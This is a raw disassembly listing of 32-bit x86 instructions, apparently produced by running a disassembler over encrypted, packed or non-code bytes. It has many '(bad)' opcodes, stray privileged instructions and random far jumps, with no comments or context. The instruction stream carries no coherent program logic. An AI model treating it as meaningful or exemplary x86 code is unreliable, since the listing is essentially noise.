  408edf:	sbb    ebp,DWORD PTR [ecx]
  408ee1:	js     0x408ef6
  408ee3:	aam    0xaa
  408ee5:	add    eax,DWORD PTR [edx]
  408ee7:	jo     0x408f1e
  408ee9:	pop    es
  408eea:	cmp    BYTE PTR [edi-0x4],al
  408eed:	in     al,0x4c
  408eef:	push   edi
  408ef0:	and    BYTE PTR [ecx-0x4c730c46],dl
  408ef6:	bts    eax,0x80
  408efa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408efb:	imul   esi,DWORD PTR [edi+0xf88f594],0x1256e247
  408f05:	jg     0x408f56
  408f07:	stos   BYTE PTR es:[edi],al
  408f08:	enter  0xe02e,0xb7
  408f0c:	ins    DWORD PTR es:[edi],dx
  408f0d:	es hlt 
  408f0f:	mov    edi,0xb5ec9866
  408f14:	popf   
  408f15:	mov    dl,BYTE PTR [ebp-0x6a7adadb]
  408f1b:	inc    ecx
  408f1c:	push   0xc399686
  408f21:	pushf  
  408f22:	lds    esp,FWORD PTR [edi-0x1f6cb260]
  408f28:	lock mov al,ds:0xbf749acf
  408f2e:	pop    eax
  408f2f:	jnp    0x408eca
  408f31:	mov    dh,0xfd
  408f33:	(bad)  
  408f34:	cmc    
  408f35:	pop    edx
  408f36:	test   BYTE PTR [ebp+0x4777ee1a],ch
  408f3c:	and    esp,DWORD PTR [ebp+0x2e7dd268]
  408f42:	push   es
  408f43:	dec    edx
  408f44:	nop
  408f45:	inc    eax
  408f46:	repnz les esp,FWORD PTR [ebx+0x24]
  408f4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f4b:	or     al,0x38
  408f4d:	mov    ebp,?
  408f4f:	imul   ebp,DWORD PTR [ebx+esi*8+0x7],0xcda2bab8
  408f57:	gs dec edx
  408f59:	aad    0x92
  408f5b:	push   ds
  408f5c:	push   ebx
  408f5d:	(bad)  
  408f5e:	mov    BYTE PTR [ecx],0x54
  408f61:	mov    ecx,0x8dc04370
  408f66:	pop    edi
  408f67:	pop    ebp
  408f68:	stc    
  408f69:	dec    esi
  408f6a:	xor    edi,DWORD PTR [esi-0x2a56cb99]
  408f70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f71:	js     0x408f5a
  408f73:	jp     0x408f6c
  408f75:	add    al,0xc8
  408f77:	adc    eax,0x5a5122a
  408f7c:	cmp    BYTE PTR [ebx-0x631bb7c0],ch
  408f82:	mov    ecx,0x4412b6ca
  408f87:	xchg   ecx,eax
  408f88:	daa    
  408f89:	sahf   
  408f8a:	xor    edi,DWORD PTR [ecx+0x5f]
  408f8d:	(bad)  
  408f8e:	ss fcmovu st,st(2)
  408f91:	out    0xc9,al
  408f93:	lods   eax,DWORD PTR ds:[esi]
  408f94:	mov    eax,0x7c6f5f9a
  408f99:	xchg   edi,eax
  408f9a:	cmp    eax,DWORD PTR [edx+0x33a1f0b7]
  408fa0:	jle    0x408fec
  408fa2:	shr    BYTE PTR gs:[ecx-0x2],1
  408fa6:	(bad)  
  408fa8:	push   0xffffffcc
  408faa:	sahf   
  408fab:	mov    edx,0xfde6e401
  408fb0:	inc    ebp
  408fb1:	inc    esi
  408fb2:	outs   dx,DWORD PTR ds:[esi]
  408fb3:	bound  edx,QWORD PTR [edi]
  408fb5:	push   ebx
  408fb6:	jp     0x408ff3
  408fb8:	pop    edx
  408fb9:	xchg   ebx,eax
  408fba:	fistp  DWORD PTR [ebx+0x34]
  408fbd:	(bad)  
  408fbe:	repz mov ah,BYTE PTR [ebp+0x35]
  408fc2:	pop    eax
  408fc3:	jmp    0xc9972412
  408fc8:	repnz dec edi
  408fca:	ud0    esi,DWORD PTR [eax-0x7e]
  408fce:	repz inc edi
  408fd0:	or     edi,ebx
  408fd2:	out    dx,eax
  408fd3:	js     0x409045
  408fd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fd6:	cmp    edx,0x694685b3
  408fdc:	std    
  408fdd:	mov    WORD PTR [ebp-0x63fd8879],cs
  408fe3:	mov    DWORD PTR [esi-0x23],eax
  408fe6:	xor    DWORD PTR [ebp-0x11253591],ecx
  408fec:	and    bh,BYTE PTR [ebx]
  408fee:	dec    ecx
  408fef:	pusha  
  408ff0:	inc    esi
  408ff1:	xor    al,0x9e
  408ff4:	repnz dec ebp
  408ff6:	add    cl,BYTE PTR [ecx-0x77]
  408ff9:	jae    0x408ff9
  408ffb:	sti    
  408ffc:	push   esp
  408ffd:	and    al,0xde
  408fff:	adc    al,0xef
  409001:	lods   al,BYTE PTR ds:[esi]
  409002:	lea    ecx,[edi]
  409004:	repnz and al,BYTE PTR [esi+0x1c]
  409008:	enter  0x4015,0x4e
  40900c:	cdq    
  40900d:	enter  0x4d74,0xaa
  409011:	and    BYTE PTR [ebp-0x33c145a1],al
  409017:	mov    ch,0xf3
  409019:	pushf  
  40901a:	(bad)  
  40901b:	pop    esp
  40901c:	int    0xaa
  40901e:	mov    WORD PTR [esi],cs
  409020:	sbb    al,0xf2
  409022:	and    BYTE PTR [edi+0x4b],ah
  409025:	loope  0x409042
  409027:	mov    ch,0xf0
  409029:	bound  ebp,QWORD PTR [ebx-0x59]
  40902c:	mov    al,ds:0x99749837
  409031:	add    ecx,ebx
  409033:	ror    DWORD PTR [esi-0x79f655d7],1
  409039:	adc    BYTE PTR [ebx],cl
  40903b:	ja     0x408fe8
  40903d:	add    eax,DWORD PTR [esi+0x1b0bbbba]
  409043:	cmp    DWORD PTR ds:0x98dbf018,edi
  409049:	cwde   
  40904a:	out    0x99,al
  40904c:	cli    
  40904d:	in     eax,dx
  40904e:	rcr    DWORD PTR [eax],cl
  409050:	mov    WORD PTR [eax],ds
  409052:	jnp    0x4090a2
  409054:	pop    ebp
  409055:	cld    
  409056:	les    eax,FWORD PTR [ecx+0x65]
  409059:	loopne 0x40906f
  40905b:	adc    cl,dh
  40905d:	shl    DWORD PTR [ebx-0x38],1
  409060:	jl     0x409067
  409062:	(bad)  
  409063:	in     al,0xad
  409065:	xor    al,0xcc
  409067:	jno    0x4090cf
  409069:	jb     0x409079
  40906b:	mov    edx,0xceb6f23a
  409070:	sahf   
  409071:	pop    edx
  409072:	ficom  WORD PTR [ebp-0x7cfe5096]
  409078:	ins    DWORD PTR es:[edi],dx
  409079:	loopne 0x409007
  40907b:	sti    
  40907c:	cdq    
  40907d:	adc    BYTE PTR [esi+0x39],dl
  409080:	mov    ds:0x76c7455b,eax
  409085:	stos   DWORD PTR es:[edi],eax
  409086:	dec    esi
  409088:	fnstsw WORD PTR [ebx-0x75f90e33]
  40908e:	stos   BYTE PTR es:[edi],al
  40908f:	fldcw  WORD PTR [eax]
  409091:	arpl   WORD PTR [edi+edx*2-0x2688dfeb],di
  409098:	push   esi
  409099:	push   cs
  40909a:	push   edx
  40909b:	test   eax,0x9599115d
  4090a0:	lods   al,BYTE PTR ds:[esi]
  4090a1:	icebp  
  4090a2:	je     0x409044
  4090a4:	add    ebx,DWORD PTR [edi]
  4090a6:	(bad)  
  4090a7:	push   esi
  4090a8:	jmp    0x6133:0x16c62840
  4090af:	daa    
  4090b0:	ficom  WORD PTR [eax]
  4090b2:	ss (bad) 
  4090b4:	retf   0xec2
  4090b7:	pop    edi
  4090b8:	or     DWORD PTR [eax],edi
  4090ba:	cwde   
  4090bb:	popf   
  4090bc:	xchg   edi,eax
  4090bd:	mov    ch,0x79
  4090bf:	data16 or bl,BYTE PTR [ebx+0x6ce9ee10]
  4090c6:	in     al,0xa3
  4090c8:	push   ecx
  4090c9:	cld    
  4090ca:	adc    bh,BYTE PTR [ecx+edx*1-0x1c]
  4090ce:	jle    0x4090af
  4090d0:	sub    al,0xb7
  4090d2:	add    esp,edi
  4090d4:	je     0x40908a
  4090d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090d7:	mov    esi,0xaf53a277
  4090dc:	cmp    al,0xb9
  4090de:	bound  edi,QWORD PTR [edx+0x3db858c]
  4090e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090e5:	mov    eax,DWORD PTR [edi-0x1fd33008]
  4090eb:	inc    ebp
  4090ec:	jo     0x4090da
  4090ee:	loopne 0x4090bb
  4090f0:	outs   dx,BYTE PTR ds:[esi]
  4090f1:	mov    ah,0xf6
  4090f3:	icebp  
  4090f4:	xor    dl,BYTE PTR [edi+edi*8]
  4090f7:	jg     0x4090e8
  4090f9:	fst    DWORD PTR [esi]
  4090fb:	std    
  4090fc:	les    edx,FWORD PTR [esi-0x40a48393]
  409102:	add    edx,edi
  409104:	icebp  
  409105:	mov    edi,0x891a4a19
  40910a:	mov    edx,0x355c8b0a
  40910f:	jg     0x40913a
  409111:	imul   ebp,DWORD PTR [ecx],0x7f
  409114:	loop   0x4090c3
  409116:	cmp    al,0x7b
  409118:	int3   
  409119:	or     bl,al
  40911b:	inc    edi
  40911c:	add    bl,BYTE PTR [ebx-0x70]
  40911f:	call   0xc8fa:0x2bc68ee1
  409126:	(bad)  
  409128:	fmul   QWORD PTR [ebp+0x2bcf1baf]
  40912e:	ret    
  40912f:	push   0xffffffe8
  409131:	mov    bl,BYTE PTR [esi+0x6f]
  409134:	popa   
  409135:	dec    esi
  409136:	nop
  409137:	and    BYTE PTR [ecx-0x603768ae],0xcd
  40913e:	jns    0x409164
  409140:	imul   esp,DWORD PTR [edi*8+0x7581ddaf],0x69
  409148:	test   BYTE PTR [bx+di+0x388d],bl
  40914d:	inc    ecx
  40914e:	enter  0x8396,0xf9
  409152:	jne    0x409168
  409154:	adc    dl,BYTE PTR [ebp-0x6938b535]
  40915a:	arpl   WORD PTR [ebp-0x69],bx
  40915d:	push   ss
  40915e:	xchg   esp,eax
  40915f:	mov    BYTE PTR [eax],cl
  409161:	ffreep st(4)
  409163:	je     0x4091ce
  409165:	adc    ecx,ecx
  409167:	test   cl,0xb9
  40916a:	out    dx,eax
  40916b:	(bad)  
  40916c:	mov    dl,0x4c
  40916e:	mov    al,0x70
  409170:	jo     0x40913b
  409172:	sahf   
  409173:	cmp    bl,BYTE PTR [ebp+edx*1+0x58]
  409177:	sbb    esp,DWORD PTR [esi+0x9]
  40917a:	das    
  40917b:	adc    esi,DWORD PTR [ecx+0x249bd154]
  409181:	xlat   BYTE PTR ds:[ebx]
  409182:	es pop es
  409184:	pop    edi
  409185:	add    eax,DWORD PTR [edi-0x1be04e38]
  40918b:	xor    BYTE PTR [edx+eax*1+0x302d39d6],bh
  409192:	pop    edx
  409193:	stos   DWORD PTR es:[edi],eax
  409194:	sbb    ah,ah
  409196:	xchg   esi,eax
  409197:	and    eax,0x2ff591
  40919c:	mov    ecx,0xa082df55
  4091a1:	cmp    BYTE PTR [edx+ebx*8-0x6e],bh
  4091a5:	fld    DWORD PTR [ebp+0x70105eb0]
  4091ab:	cdq    
  4091ac:	jo     0x409175
  4091ae:	sub    DWORD PTR [ebp+esi*8+0x3],0xffffff89
  4091b3:	loopne 0x409213
  4091b5:	fucomi st,st(7)
  4091b7:	or     esp,DWORD PTR [eax-0x2d]
  4091ba:	adc    esp,0xed84b914
  4091c0:	jle    0x409160
  4091c2:	(bad)  
  4091c3:	pop    ss
  4091c4:	push   esp
  4091c5:	lods   eax,DWORD PTR ds:[esi]
  4091c6:	xor    ebx,esp
  4091c8:	loope  0x4091be
  4091ca:	rep ins BYTE PTR es:[edi],dx
  4091cc:	and    eax,ebp
  4091ce:	xor    eax,0xb5d9ceb5
  4091d3:	push   esp
  4091d4:	sbb    bh,BYTE PTR [edi+ecx*2-0x3d]
  4091d8:	jne    0x409162
  4091da:	jmp    0x728:0x6536fbfe
  4091e1:	imul   edi,DWORD PTR [ecx],0x6f
  4091e4:	std    
  4091e5:	loope  0x409245
  4091e7:	inc    edi
  4091e8:	scas   eax,DWORD PTR es:[edi]
  4091e9:	mov    esi,0x911c4f38
  4091ee:	outs   dx,DWORD PTR ds:[esi]
  4091ef:	add    al,0xaa
  4091f1:	int    0x57
  4091f3:	dec    edi
  4091f4:	stos   DWORD PTR es:[edi],eax
  4091f5:	lds    eax,FWORD PTR [esi-0x7a]
  4091f8:	mov    BYTE PTR [ebx-0x2d5f100b],bl
  4091fe:	sbb    ebx,edx
  409200:	xchg   edx,eax
  409201:	fmul   DWORD PTR [edi]
  409203:	and    edi,esp
  409205:	and    BYTE PTR [eax+0x931d1d2],ah
  40920b:	dec    edx
  40920c:	add    dh,BYTE PTR [edx+edi*4+0x13]
  409210:	dec    edi
  409211:	out    0x43,al
  409213:	mov    eax,ds:0xac10cd57
  409218:	fisub  DWORD PTR [esi+0x2e]
  40921b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40921c:	aam    0xe6
  40921e:	or     DWORD PTR [ebp+edi*1+0x6f],esp
  409222:	push   ss
  409223:	pop    ebx
  409224:	sub    edi,DWORD PTR [edi-0x64cad428]
  40922a:	pusha  
  40922b:	mov    eax,ds:0x330d3dce
  409230:	mov    ch,0x29
  409232:	and    ah,BYTE PTR [eax+0x69d7a5ae]
  409238:	pop    ds
  409239:	loop   0x4091d0
  40923b:	frstor [edi]
  40923d:	xchg   ecx,eax
  40923e:	sahf   
  40923f:	lds    ebp,FWORD PTR [esi+0x4d285775]
  409245:	add    ecx,DWORD PTR [esp+eax*4]
  409248:	add    al,0x50
  40924a:	mov    ecx,DWORD PTR [esi+eax*4-0x78d0c4d1]
  409251:	not    esi
  409253:	aam    0xf7
  409255:	shr    esp,1
  409257:	mov    esp,0x6357d721
  40925c:	fst    QWORD PTR [ebx-0x6e]
  40925f:	sbb    BYTE PTR ds:0x115bea94,ah
  409265:	sbb    ah,BYTE PTR [ebx]
  409267:	fdiv   st,st(3)
  409269:	inc    eax
  40926a:	jp     0x4092bf
  40926c:	push   es
  40926d:	and    eax,0x47be8792
  409272:	mov    ecx,DWORD PTR [edx-0x260939b6]
  409278:	and    BYTE PTR [ebx-0x5c],bl
  40927b:	jns    0x4092df
  40927d:	xchg   DWORD PTR [eax+0x53],eax
  409280:	scas   eax,DWORD PTR es:[edi]
  409281:	nop
  409282:	mov    ah,0xfa
  409284:	sbb    DWORD PTR [ebp-0x13],esi
  409287:	sbb    edx,DWORD PTR [eax]
  409289:	sbb    eax,0x54235412
  40928e:	sbb    edi,DWORD PTR [ecx+0x55]
  409291:	fcom   st(5)
  409293:	jnp    0x40930a
  409295:	inc    edx
  409296:	iret   
  409297:	sbb    eax,0x27387d01
  40929c:	cmp    BYTE PTR [ebp+0x1bc1d704],0x4c
  4092a3:	pushf  
  4092a4:	push   ecx
  4092a5:	mov    edx,0xde22d539
  4092aa:	jl     0x409327
  4092ac:	push   esp
  4092ad:	inc    eax
  4092ae:	sbb    dl,cl
  4092b0:	mov    eax,es
  4092b2:	repz jmp 0xe6f4:0xb42bdd30
  4092ba:	scas   eax,DWORD PTR es:[edi]
  4092bb:	call   0x2064:0xb65786ca
  4092c2:	sbb    esi,DWORD PTR [ecx+ebx*4]
  4092c5:	lock xchg esp,eax
  4092c7:	cdq    
  4092c8:	jbe    0x409291
  4092ca:	fmul   DWORD PTR [esi-0x70]
  4092cd:	cs dec ebp
  4092cf:	mov    ebp,0x2e21a3b5
  4092d4:	(bad)  
  4092d5:	loop   0x4092bd
  4092d7:	push   0xffffffa9
  4092d9:	jmp    0xd5861d8a
  4092de:	mov    ah,0x81
  4092e0:	mov    edx,0xc630da32
  4092e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092e6:	mov    ds,WORD PTR [ebx-0x42051968]
  4092ec:	ss mov al,0x56
  4092ef:	rcr    ebx,cl
  4092f1:	push   0x61
  4092f3:	icebp  
  4092f4:	lds    ecx,FWORD PTR [edi+0x3c]
  4092f7:	rcr    BYTE PTR [eax-0x53bcf912],0x27
  4092fe:	das    
  4092ff:	int3   
  409300:	pop    es
  409301:	xchg   esp,eax
  409302:	aas    
  409303:	clc    
  409304:	lds    ebp,FWORD PTR [ecx-0x12]
  409307:	ret    0xbd84
  40930a:	mov    al,ds:0xded76635
  40930f:	imul   esi,ebx,0xffffff84
  409312:	jae    0x409336
  409314:	dec    BYTE PTR [edx+eax*1-0x8]
  409318:	xchg   edi,eax
  409319:	stos   BYTE PTR es:[edi],al
  40931a:	dec    edx
  40931b:	fisubr WORD PTR [edi]
  40931d:	mov    cl,0xcd
  40931f:	jae    0x409325
  409321:	or     eax,ebp
  409323:	sbb    DWORD PTR [ebx+0x61],esi
  409326:	mov    eax,0x31542561
  40932b:	adc    ecx,eax
  40932d:	xor    bh,bh
  40932f:	aam    0x88
  409331:	add    ebx,ebx
  409333:	ss jne 0x4092f3
  409336:	arpl   WORD PTR [edi],bp
  409338:	or     eax,0x824a0295
  40933d:	sahf   
  40933e:	gs ss inc ebx
  409341:	loope  0x409316
  409343:	cs push cs
  409345:	adc    ebp,0xb49f00cc
  40934b:	push   0x59
  40934d:	test   DWORD PTR [ecx],edx
  40934f:	dec    esi
  409350:	xchg   esp,eax
  409351:	xchg   ebp,eax
  409352:	icebp  
  409353:	cmp    esp,eax
  409355:	pop    esp
  409356:	xchg   esi,eax
  409357:	pusha  
  409358:	adc    ebp,esi
  40935a:	pop    es
  40935b:	imul   esp,DWORD PTR [edi+0x70],0x59
  40935f:	xchg   ebx,eax
  409360:	icebp  
  409361:	leave  
  409362:	or     DWORD PTR [eax+0x6ab8534f],ebx
  409368:	sub    eax,0x82ad0a3d
  40936d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40936e:	push   edx
  40936f:	ja     0x4093ac
  409371:	mov    cl,0xa3
  409373:	cli    
  409374:	sbb    al,0x66
  409376:	add    BYTE PTR [esi-0x61cb4060],bl
  40937c:	add    esp,DWORD PTR [edi+0x48aa0bb3]
  409382:	push   esi
  409383:	jle    0x409365
  409385:	icebp  
  409386:	or     ebx,DWORD PTR [eax]
  409388:	sti    
  409389:	sub    al,0x46
  40938b:	dec    edx
  40938c:	pushf  
  40938d:	mov    bl,0x67
  40938f:	shr    DWORD PTR ds:0xa29266,cl
  409395:	mov    ecx,0xc6fba4eb
  40939a:	cmp    al,0x27
  40939c:	mov    edx,0x761d3b0d
  4093a1:	mov    edx,0x2f1c2b73
  4093a6:	repnz scas eax,DWORD PTR es:[edi]
  4093a8:	mov    BYTE PTR cs:[esi+0x38],bl
  4093ac:	cmc    
  4093ad:	xchg   ebx,eax
  4093ae:	push   ecx
  4093af:	not    DWORD PTR [ebx]
  4093b1:	call   0xcaf70e0d
  4093b6:	xlat   BYTE PTR ds:[ebx]
  4093b7:	sar    DWORD PTR [esi+0x4d036cbb],0x14
  4093be:	mov    ah,0x7a
  4093c0:	inc    edi
  4093c1:	xor    eax,ecx
  4093c3:	jo     0x40936e
  4093c5:	stos   BYTE PTR es:[edi],al
  4093c6:	call   0x813ed6ff
  4093cb:	add    ch,dh
  4093cd:	xchg   esp,eax
  4093ce:	push   eax
  4093cf:	hlt    
  4093d0:	mov    bl,0xac
  4093d2:	adc    esi,DWORD PTR [edx+0x6248bc06]
  4093d8:	pop    ss
  4093d9:	rcl    BYTE PTR [eax-0x48],0xcf
  4093dd:	push   esp
  4093de:	pop    ebx
  4093df:	fiadd  WORD PTR [esi+0x5bd18fba]
  4093e5:	test   BYTE PTR [eax-0x611855df],al
  4093eb:	xchg   DWORD PTR [ebx+0x2b],esp
  4093ee:	sub    eax,0xe33e18f3
  4093f3:	into   
  4093f4:	pop    ecx
  4093f5:	cmp    eax,0xcaf960cb
  4093fa:	lahf   
  4093fb:	adc    al,BYTE PTR ds:0x1888abf9
  409401:	pop    ebp
  409402:	fwait
  409403:	popf   
  409404:	ret    0x569f
  409407:	add    eax,0x5585523b
  40940c:	jnp    0x40939a
  40940e:	mov    ah,0x8f
  409410:	ret    
  409411:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409412:	sbb    al,0x83
  409414:	and    DWORD PTR [edx-0x106524c7],esp
  40941a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40941b:	mov    BYTE PTR [ecx],al
  40941d:	and    BYTE PTR [ebp+0x3],bl
  409420:	mov    bh,0xba
  409422:	adc    eax,0xabc14b5e
  409427:	pusha  
  409428:	push   ebp
  409429:	push   edi
  40942a:	xchg   edx,eax
  40942b:	mov    esi,0x261b5eb5
  409430:	ror    eax,cl
  409432:	adc    DWORD PTR [ecx+0x28],ecx
  409435:	js     0x4093bc
  409437:	mov    bh,0x63
  409439:	ja     0x4094b1
  40943b:	xchg   ecx,eax
  40943c:	loope  0x4094ab
  40943e:	sbb    al,0x4d
  409440:	lods   eax,DWORD PTR ds:[esi]
  409441:	out    0x76,al
  409443:	xchg   edx,eax
  409444:	sub    bh,ch
  409446:	jecxz  0x409486
  409448:	or     al,ah
  40944a:	mov    ch,0xee
  40944c:	xchg   BYTE PTR [edi+0x4c],cl
  40944f:	aaa    
  409450:	mov    ds:0x5c78d960,al
  409455:	gs jne 0x409494
  409458:	test   esi,ecx
  40945a:	test   DWORD PTR [eax],ecx
  40945c:	ficomp WORD PTR [esi-0x60]
  40945f:	ja     0x40948e
  409461:	sbb    BYTE PTR [ecx+0x7c],ah
  409464:	push   ebx
  409465:	adc    ah,bh
  409467:	add    DWORD PTR [edi+0x5d768999],0xb11a18b4
  409471:	pop    es
  409472:	jmp    0x4094e9
  409474:	pusha  
  409475:	mov    ds:0x6f5540a4,al
  40947a:	shr    ebx,cl
  40947c:	mov    dl,0xcd
  40947e:	dec    ebp
  40947f:	pop    es
  409480:	push   ebp
  409481:	mov    al,0xe5
  409483:	pushf  
  409484:	push   edi
  409485:	mov    ebp,DWORD PTR [esi-0x38b77ddd]
  40948b:	ss gs (bad) 
  40948e:	fwait
  40948f:	xor    eax,0x32004a69
  409494:	dec    esi
  409495:	mov    bh,0x38
  409497:	popa   
  409498:	or     esi,DWORD PTR [edi]
  40949a:	mov    edx,0x1b2ea2c5
  40949f:	ins    BYTE PTR es:[edi],dx
  4094a0:	gs aad 0x90
  4094a3:	scas   eax,DWORD PTR es:[edi]
  4094a4:	ins    BYTE PTR es:[edi],dx
  4094a5:	xchg   esi,eax
  4094a6:	fcom   DWORD PTR [eax-0x37d8afb7]
  4094ac:	mov    cl,0xa5
  4094ae:	push   ss
  4094af:	popf   
  4094b0:	mov    eax,0xb284728d
  4094b5:	scas   eax,DWORD PTR es:[edi]
  4094b6:	sub    eax,0x1f8f4a72
  4094bb:	jg     0x4094e4
  4094bd:	test   eax,0x43848f91
  4094c2:	push   es
  4094c3:	ror    DWORD PTR [edx+0x7bc6962e],cl
  4094c9:	jbe    0x4094b7
  4094cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094cc:	sahf   
  4094cd:	fistp  WORD PTR [ebx+0x282d9f6c]
  4094d3:	and    ah,BYTE PTR [ecx-0x66]
  4094d6:	mov    bl,0x4c
  4094d8:	inc    ecx
  4094d9:	loopne 0x4094a9
  4094db:	mov    esp,0x69ecf23f
  4094e0:	sbb    eax,DWORD PTR [eax+0x31]
  4094e3:	push   edi
  4094e4:	mov    ebp,0xa63336fd
  4094e9:	jns    0x40952b
  4094eb:	jl     0x409520
  4094ed:	in     eax,0x88
  4094ef:	mov    al,0x7b
  4094f1:	sti    
  4094f2:	lahf   
  4094f3:	xchg   edi,eax
  4094f4:	imul   eax,DWORD PTR [edx+0x74],0xffffffa3
  4094f8:	mov    cs,WORD PTR [ecx+ebp*1+0x34]
  4094fc:	retf   0xccaa
  4094ff:	loop   0x409524
  409501:	jno    0x40956f
  409503:	dec    BYTE PTR [esi-0xab1616d]
  409509:	outs   dx,DWORD PTR ds:[esi]
  40950a:	mov    ebp,0xaa46337f
  40950f:	mov    ebp,0x17fa117a
  409514:	adc    al,0x61
  409516:	add    ebx,DWORD PTR [ecx+0x7e77d048]
  40951c:	pop    edi
  40951d:	aam    0x50
  40951f:	pop    edi
  409520:	out    0xcf,al
  409522:	shl    al,1
  409524:	sbb    edx,DWORD PTR [edx-0x5cbf000c]
  40952a:	lea    ebx,[ebx]
  40952c:	fnstcw WORD PTR [eax]
  40952e:	fwait
  40952f:	ins    BYTE PTR es:[edi],dx
  409530:	fdiv   DWORD PTR [eax+0xd302281]
  409536:	fidivr WORD PTR [eax+0x1b]
  409539:	nop
  40953a:	js     0x40950a
  40953c:	jge    0x409506
  40953e:	push   edx
  40953f:	stc    
  409540:	inc    esp
  409541:	push   edi
  409542:	cwde   
  409543:	(bad)  
  409544:	xor    BYTE PTR [ebx],bl
  409546:	pop    ecx
  409547:	loopne 0x4094dd
  409549:	clc    
  40954a:	adc    eax,0xa528f67
  40954f:	mov    ecx,0xba9a40ac
  409554:	and    eax,0x161bbe4b
  409559:	sbb    eax,ebx
  40955b:	jbe    0x40958c
  40955d:	ja     0x409503
  40955f:	push   0x9bf41224
  409564:	jnp    0x4095c1
  409566:	call   0xb8c0:0x78524dd3
  40956d:	fisttp QWORD PTR [bx+di]
  409570:	mov    ds:0xe8f7b42c,eax
  409575:	pushf  
  409576:	add    DWORD PTR [bx+si],ecx
  409579:	xlat   BYTE PTR ds:[ebx]
  40957a:	leave  
  40957b:	inc    eax
  40957c:	and    BYTE PTR [ecx-0x412f94d],ch
  409582:	mov    bl,0x1f
  409584:	pop    esp
  409585:	push   esp
  409586:	pop    ecx
  409587:	push   ds
  409588:	and    dh,ah
  40958a:	lds    edx,FWORD PTR [esi+edx*8]
  40958d:	and    BYTE PTR [edi+0x39],dh
  409590:	cli    
  409591:	cmp    BYTE PTR [ecx+0x11d47036],ah
  409597:	test   al,0xa4
  409599:	cli    
  40959a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40959b:	jecxz  0x40955e
  40959d:	imul   esp,DWORD PTR [edx],0x5bb4f0fc
  4095a3:	or     eax,0x1a7b5802
  4095a8:	mov    cs:0xd7310634,al
  4095ae:	jl     0x4095a0
  4095b0:	ror    cl,1
  4095b2:	mov    ebp,0x2a8130e1
  4095b7:	cwde   
  4095b8:	inc    edi
  4095b9:	inc    ebx
  4095ba:	and    dl,bl
  4095bc:	jns    0x4095b4
  4095be:	pusha  
  4095bf:	pop    esi
  4095c0:	push   ecx
  4095c1:	sbb    bl,BYTE PTR [ecx]
  4095c3:	push   ecx
  4095c4:	mov    ebp,0xa91af1bb
  4095c9:	mov    dh,0x3a
  4095cb:	jle    0x409557
  4095cd:	mov    WORD PTR [ecx+0x11],ss
  4095d0:	cmp    BYTE PTR fs:[edx-0x319e8e04],bl
  4095d7:	xor    BYTE PTR [esi-0x71f0cb3],ah
  4095dd:	dec    ecx
  4095de:	push   0x43
  4095e0:	mov    dl,cl
  4095e2:	aam    0xb1
  4095e4:	hlt    
  4095e5:	data16 rcl BYTE PTR [ecx+0x4311fcac],1
  4095ec:	dec    esi
  4095ed:	fwait
  4095ee:	imul   ecx,DWORD PTR [eax+0x54],0xffffffff
  4095f2:	pop    ecx
  4095f3:	lahf   
  4095f4:	(bad)  
  4095f5:	xchg   edi,eax
  4095f6:	out    0x2,al
  4095f8:	xor    DWORD PTR [ebx+edi*4-0x61],ebx
  4095fc:	or     DWORD PTR [ebp+0x1903479f],esi
  409602:	pop    ss
  409603:	jbe    0x4095ca
  409605:	add    esp,DWORD PTR [eax-0x5ff37741]
  40960b:	adc    al,0xd8
  40960d:	cld    
  40960e:	arpl   WORD PTR [ebx+eiz*2-0x58],bx
  409612:	std    
  409613:	ret    
  409614:	and    esi,DWORD PTR [eax+0x9]
  409617:	mov    dh,0x39
  409619:	mov    edx,0x599e8e06
  40961e:	mov    edx,0xd07b6ea6
  409623:	retf   
  409624:	ins    DWORD PTR es:[edi],dx
  409625:	cmp    bh,cl
  409627:	jmp    0xf880:0x27d1fef1
  40962e:	push   ss
  40962f:	push   es
  409630:	enter  0x698a,0x63
  409634:	and    al,0xa7
  409636:	stc    
  409637:	fisttp DWORD PTR [edx+0x1de7c999]
  40963d:	inc    eax
  40963e:	int3   
  40963f:	push   ebx
  409640:	(bad)  
  409641:	pop    ds
  409642:	xchg   ecx,eax
  409643:	js     0x4096ae
  409645:	ja     0x409601
  409647:	in     al,0xf2
  409649:	das    
  40964a:	jb     0x40962a
  40964c:	add    al,0xb6
  40964e:	in     al,0xd8
  409650:	pop    esi
  409651:	sub    BYTE PTR [ecx-0x2a08af7b],dl
  409657:	jmp    0x219a:0xa12a92f4
  40965e:	ds mov eax,esp
  409661:	(bad)  
  409662:	sti    
  409663:	repz push edx
  409665:	xchg   esp,eax
  409666:	(bad)  
  409667:	and    eax,0x29204bd3
  40966c:	out    0x5,al
  40966e:	ret    
  40966f:	mov    edx,0x33f6fd04
  409674:	cli    
  409675:	out    dx,eax
  409676:	xor    al,0x3b
  409678:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409679:	mov    al,ds:0xe83819ce
  40967e:	ficomp DWORD PTR [esi+0x25]
  409681:	xor    BYTE PTR [ecx+0x2ca02e8c],0x75
  409688:	mov    edx,0x3eae74b2
  40968d:	jne    0x4096bc
  40968f:	inc    ecx
  409690:	and    eax,DWORD PTR [edi+0x41]
  409693:	ins    BYTE PTR es:[edi],dx
  409694:	call   0x6f0:0x20726399
  40969b:	les    si,DWORD PTR [eax-0x31292313]
  4096a2:	pop    ds
  4096a3:	lahf   
  4096a4:	rcr    BYTE PTR [ebx+ebp*4+0xd],cl
  4096a8:	lds    esi,FWORD PTR [edx]
  4096aa:	retf   
  4096ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096ac:	sbb    DWORD PTR [edx],0xffffff8f
  4096af:	pushf  
  4096b0:	mov    ds:0xace611b6,eax
  4096b5:	hlt    
  4096b6:	rcl    edx,cl
  4096b8:	mov    edx,0x901bdbdd
  4096bd:	imul   ebp,DWORD PTR [ecx],0xbbcc4dcd
